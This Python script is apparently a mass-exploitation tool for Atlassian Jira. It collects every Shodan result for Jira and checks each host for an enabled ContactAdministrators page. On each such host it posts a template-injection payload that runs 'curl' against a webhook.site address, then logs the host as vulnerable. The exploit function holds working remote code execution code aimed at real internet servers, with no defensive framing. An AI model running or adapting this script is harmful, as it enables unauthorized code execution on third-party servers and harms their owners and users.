import json
import requests
import os
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

QUERY = 'http.component:"atlassian jira"'
OUTPUT_FILENAME = "jira_output"
OUTPUT_FILENAME_DOWNLOADED = OUTPUT_FILENAME + ".json.gz"
DECOMPRESSED_FILENAME = OUTPUT_FILENAME + ".json"

jira_hosts = []

def recover_scanned_hosts():
    try:
        with open('scanned_hosts.txt', 'r') as host:
            for i in host.readlines():
                jira_hosts.append(i.rstrip("\n"))
    except Exception as e:
        print(e)

def download_data_from_Shodan(query):
    result = os.system('shodan download --limit -1 {} {}'.format(OUTPUT_FILENAME, query))
    if(result != 0):
        return False
    return True

def decompress_data(filename):
    result = os.system('gzip -d {}'.format(filename))
    if(result != 0):
        return False
    return True

def load_results(filename):
    results = []
    hosts = open(filename, 'r')
    
    for host in hosts.readlines():
        results.append(json.loads(host))
    
    return results

def prepare_data():
    data = ""
    if(download_data_from_Shodan(QUERY)):
        if(decompress_data(OUTPUT_FILENAME_DOWNLOADED)):
            data = load_results('jira_output.json')
        else:
            print('error')
    else:
        print('error')

    recover_scanned_hosts()
    hosts = extract_hosts(data)
    formated_hosts = format_hosts(hosts)
    
    return formated_hosts

def extract_hosts(all_data):
    hosts = {}

    host_list = []
    http_ports = []

    for data in all_data:
        ports = []

        if(type(data['data']) == list):
            for i in range(len(data['data'])):
                ports.append(data['data'][i]['port'])
   
        else:
            ports.append(data['port'])


        host_list.append(data['ip_str'])
        http_ports.append(ports)

                
    hosts['ip_str'] = host_list
    hosts['ports'] = http_ports

    return hosts

def format_hosts(hosts):
    all_hosts = hosts

    formated_hosts = []

    for i in range(len(all_hosts['ip_str'])):
        host = ""
        if(len(all_hosts['ports'][i]) > 1):
            for port in all_hosts['ports'][i]:
                if(port != 443):
                    host += "http://" + all_hosts['ip_str'][i] + ":" + str(port)
                else:
                    host += "https://" + all_hosts['ip_str'][i] + ":" + str(port)

        else:
            if(all_hosts['ports'][i][0] != 443):
                host += "http://" + all_hosts['ip_str'][i] + ":" + str(all_hosts['ports'][i][0])
            
            else:
                host += "https://" + all_hosts['ip_str'][i] + ":" + str(all_hosts['ports'][i][0])
            
        formated_hosts.append(host)

    return formated_hosts

def extract_hostname(response_body):
    hostname = ""

    try:
        REGEX_HOSTNAME = 'class="aui-header-logo aui-header-logo-custom"><a href="'

        t = re.search(REGEX_HOSTNAME, response_body)

        span = t.span()

        hostname = response_body[span[1]:].split("\"")[0]
    
    except Exception as e:
        print("Erro: {}".format(e))

    return hostname

def verify_ContactAdministrators_page(host):
    url = ""
    
    if(host[-1] == "/"):
        url = host + "ContactAdministrators!default.jspa"
    else:
        url = host + "/../ContactAdministrators!default.jspa"
    
    try:
        request = requests.get(url, verify=False, allow_redirects=True, timeout=5)
        if('name="subject"' in request.text):
            return True

        else:
            return False

    except Exception as e:
        print("Error: {}".format(e))


def save(text):
    os.system('echo "Host: {} | Domain: {}" >> vulnerables_output.txt'.format(text[0], text[1]))

def verify_jira(host):

    if(host in jira_hosts):
        return 
    else:
        try:
            os.system('echo "{}" >> scanned_hosts.txt'.format(host))
            print(host)
            request = requests.get(host, verify=False, allow_redirects=True, timeout=5)
            jira_hosts.append(host)

            if('name="atlassian-token"' in request.text):
                
                if(verify_ContactAdministrators_page(request.url)):
                    hostname = extract_hostname(request.text)
                    print("Host: {} have the Contact Page Habilited | Domain: {}".format(host, hostname))
                    exploit(request.url, request.text)
                    save((host, hostname))
                    
                print("Not Vulnerable")

        except Exception as e:
            print("Error: {}".format(e))

def exploit(host, response_body):
    print("[+] Exploiting [+]")
    atlassian_meta = re.search('name="atlassian-token" content="', response_body)
    span = atlassian_meta.span()

    atl_token = response_body[span[1]:].split("\"")[0]

    
    url = ""
    
    if(host[-1] == "/"):
        url = host + "ContactAdministrators.jspa"
    else:
        url = host + "/../ContactAdministrators.jspa"

    web_server = "http://webhook.site/" + host
    
    cookies = {
        'atlassian.xsrf.token': atl_token,
        'JSESSIONID': '3EF8DCD599A0A001F80EDDC08B31AE18',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    }

    data = {
        'from': 'rapt00rr@protonmail.com',
        'subject': '$i18n.getClass().forName(\'java.lang.Runtime\').getMethod(\'getRuntime\',null).invoke(null,null).exec(\'curl {}\').waitFor()'.format(web_server),
        'details': 'test',
        'atl_token': atl_token,
        'Send': 'Send'
    }

    response = requests.post(url, headers=headers, cookies=cookies, data=data, verify=False, allow_redirects=True, timeout=7)
    print(response.status_code)
    print("[+] Exploited Successful, check your logs [+]")

def main():
    all_hosts = prepare_data()
    for host in all_hosts:
        verify_jira(host)

main()